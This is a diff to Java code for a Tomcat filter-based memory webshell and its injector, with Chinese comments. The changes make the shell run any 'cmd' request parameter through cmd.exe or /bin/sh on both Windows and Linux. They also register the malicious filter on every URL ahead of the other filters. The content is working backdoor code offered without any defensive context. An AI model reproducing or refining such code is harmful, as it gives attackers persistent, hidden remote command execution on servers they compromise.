@@ -138,7 +138,6 @@ ObjectName name = new ObjectName("Catalina:type=Server");
 import javax.servlet.*;
 import java.io.IOException;
 import java.io.InputStream;
-import java.lang.reflect.Method;
 import java.util.Scanner;
 
 public class FilterMemShell implements Filter {
@@ -154,8 +153,14 @@ public class FilterMemShell implements Filter {
         String cmd = request.getParameter("cmd");
         if (cmd != null && !cmd.isEmpty()) {
             try {
-                // 执行系统命令
-                Process process = Runtime.getRuntime().exec(cmd);
+                // 执行系统命令（兼容 Windows / Linux）
+                boolean isWindows = System.getProperty("os.name")
+                    .toLowerCase().contains("windows");
+                String[] fullCmd = isWindows 
+                    ? new String[]{"cmd.exe", "/c", cmd}
+                    : new String[]{"/bin/sh", "-c", cmd};
+
+                Process process = Runtime.getRuntime().exec(fullCmd);
                 InputStream inputStream = process.getInputStream();
                 Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                 String result = scanner.hasNext() ? scanner.next() : "";
@@ -220,7 +225,7 @@ public class FilterMemShellInjector {
         FilterMap filterMap = new FilterMap();
         filterMap.setFilterName(filterName);
         filterMap.addURLPattern("/*");
-        filterMap.setDispatcher(FilterMap.REQUEST.name());
+        filterMap.setDispatcher("REQUEST");
 
         // Step 6: 将 FilterMap 插入到首位（确保优先执行）
         context.addFilterMap(filterMap);
